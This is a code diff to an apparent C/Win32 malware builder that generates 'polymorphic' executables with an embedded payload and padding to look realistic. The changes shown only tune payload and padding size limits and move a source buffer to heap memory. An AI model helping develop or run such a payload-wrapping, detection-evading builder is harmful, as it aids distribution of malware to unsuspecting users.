@@ -141,7 +141,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             payloadSize = ftell(inputFile);
             fseek(inputFile, 0, SEEK_SET);
             
-            if (payloadSize > 0 && payloadSize < 10485760) { // Max 10MB payload
+            if (payloadSize > 0 && payloadSize < 102400) { // Max 100KB payload to prevent buffer overflow
                 payloadData = (char*)malloc(payloadSize);
                 if (payloadData) {
                     fread(payloadData, 1, payloadSize, inputFile);
@@ -461,7 +461,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
     
     if (payloadData && payloadSize > 0) {
         // Add padding to make executable larger and more realistic
-        size_t paddingSize = 16384 + (rand() % 32768); // 16-48KB additional padding
+        size_t paddingSize = 4096 + (rand() % 8192); // 4-12KB additional padding
         size_t totalDataSize = payloadSize + paddingSize;
         size_t arraySize = (totalDataSize * 6) + 2048; // Space for hex formatting + headers
         
@@ -508,7 +508,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         }
     } else {
         // Generate large dummy data for benign executables to make them realistic size
-        size_t dummySize = 32768 + (rand() % 65536); // 32-96KB dummy data
+        size_t dummySize = 8192 + (rand() % 16384); // 8-24KB dummy data
         size_t arraySize = (dummySize * 6) + 2048;
         
         payloadByteArray = (char*)malloc(arraySize);
@@ -727,8 +727,12 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
         
         // Generate polymorphic source code with actual payload embedding
-        char sourceCode[262144]; // 256KB buffer for large embedded payloads
-        generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
+        const size_t sourceCodeSize = 1048576; // 1MB buffer for large embedded payloads
+        char* sourceCode = (char*)malloc(sourceCodeSize);
+        if (!sourceCode) {
+            continue; // Skip this batch if allocation fails
+        }
+        generatePolymorphicExecutableWithPayload(sourceCode, sourceCodeSize, encType, delType, inputPath);
         
         // Create temporary source file
         char tempSource[256];
@@ -801,6 +805,9 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 PostMessage(hMainWindow, WM_USER + 3, 0, 0);
             }
         }
+        
+        // Free allocated source code buffer
+        free(sourceCode);
         
         // Delay between batches
         if (batch < batchCount - 1) {
